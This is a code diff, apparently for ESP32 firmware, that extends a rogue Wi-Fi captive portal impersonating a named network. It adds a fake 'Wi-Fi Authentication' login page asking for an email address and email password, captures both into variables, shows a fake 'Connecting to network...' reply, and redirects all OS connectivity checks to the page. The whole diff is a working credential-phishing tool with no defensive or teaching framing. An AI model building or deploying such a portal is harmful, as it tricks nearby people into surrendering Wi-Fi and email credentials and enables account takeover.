@@ -11,6 +11,7 @@ AsyncWebServer async_server(80);
 bool portalRunning = false;
 bool isCaptured = false;
 
+String capturedEmail = "";
 String capturedPassword = "";
 String currentSSID = "";
 
@@ -45,6 +46,33 @@ const char index_html[] PROGMEM = R"=====(
 </html>
 )=====";
 
+const char index_email_pass_html[] PROGMEM = R"=====(
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Wi-Fi Authentication</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    body { font-family: Arial, sans-serif; background-color: #f0f0f0; text-align: center; padding: 20px; }
+    .login-form { background: white; max-width: 300px; margin: 0 auto; padding: 20px; border-radius: 5px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
+    input[type="password"] { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
+    input[type="submit"] { background-color: #4CAF50; color: white; padding: 10px 15px; border: none; border-radius: 4px; cursor: pointer; }
+    input[type="submit"]:hover { background-color: #45a049; }
+  </style>
+</head>
+<body>
+  <div class="login-form">
+    <h2>Wi-Fi Authentication</h2>
+    <form action="/login" method="POST">
+      <input type="email" name="email" placeholder="Email" required>
+      <input type="password" name="password" placeholder="Email password" required>
+      <input type="submit" value="Connect">
+    </form>
+  </div>
+</body>
+</html>
+)=====";
+
 void startSoftAccessPoint() {
   WiFi.mode(WIFI_MODE_AP);
   WiFi.softAPConfig(localIP, gatewayIP, subnetMask);
@@ -64,7 +92,7 @@ void setUpDNSServer() {
   dnsServer.start(53, "*", localIP);
 }
 
-void setUpWebserver() {
+void setUpWebserver(bool email_and_pass) {
   async_server.on("/generate_204", [](AsyncWebServerRequest *request) { request->redirect(localIPURL); });
   async_server.on("/redirect", [](AsyncWebServerRequest *request) { request->redirect(localIPURL); });
   async_server.on("/hotspot-detect.html", [](AsyncWebServerRequest *request) { request->redirect(localIPURL); });
@@ -75,32 +103,43 @@ void setUpWebserver() {
   async_server.on("/wpad.dat", [](AsyncWebServerRequest *request) { request->send(404); });
   async_server.on("/favicon.ico", [](AsyncWebServerRequest *request) { request->send(404); });
 
-  async_server.on("/", HTTP_ANY, [](AsyncWebServerRequest *request) {
-    request->send(200, "text/html", index_html);
-  });
-
-  async_server.on("/login", HTTP_POST, [](AsyncWebServerRequest *request) {
-    if (request->hasParam("password", true)) {
-      capturedPassword = request->getParam("password", true)->value();
-      request->send(200, "text/html", "<h2>Connecting to network...</h2>");
-      isCaptured = true;
-      delay(100);
+  async_server.on("/", HTTP_ANY, [email_and_pass](AsyncWebServerRequest *request) {
+    if (email_and_pass){
+      request->send(200, "text/html", index_email_pass_html);
+    }
+    else {
+      request->send(200, "text/html", index_html);
     }
   });
+
+async_server.on("/login", HTTP_POST, [](AsyncWebServerRequest *request) {
+  if (request->hasParam("email", true) && request->hasParam("password", true)) {
+    capturedEmail = request->getParam("email", true)->value();
+    capturedPassword = request->getParam("password", true)->value();
+    request->send(200, "text/html", "<h2>Connecting to network...</h2>");
+    isCaptured = true;
+    delay(100);
+  } else if (request->hasParam("password", true)) {
+    capturedPassword = request->getParam("password", true)->value();
+    request->send(200, "text/html", "<h2>Connecting to network...</h2>");
+    isCaptured = true;
+    delay(100);
+  }
+});
 
   async_server.onNotFound([](AsyncWebServerRequest *request) {
     request->redirect(localIPURL);
   });
 }
 
-void startCaptivePortal(String* ssid) {
+void startCaptivePortal(String* ssid, bool email_and_pass) {
   if (portalRunning) return;
   
   currentSSID = *ssid;
 
   startSoftAccessPoint();
   setUpDNSServer();
-  setUpWebserver();
+  setUpWebserver(email_and_pass);
   async_server.begin();
   
   portalRunning = true;
@@ -121,6 +160,9 @@ void stopCaptivePortal() {
 
 void updateCaptivePortal()
 {
-  dnsServer.processNextRequest();
-  delay(DNS_INTERVAL);
+  if (portalRunning)
+  {
+    dnsServer.processNextRequest();
+    delay(DNS_INTERVAL);
+  }
 }
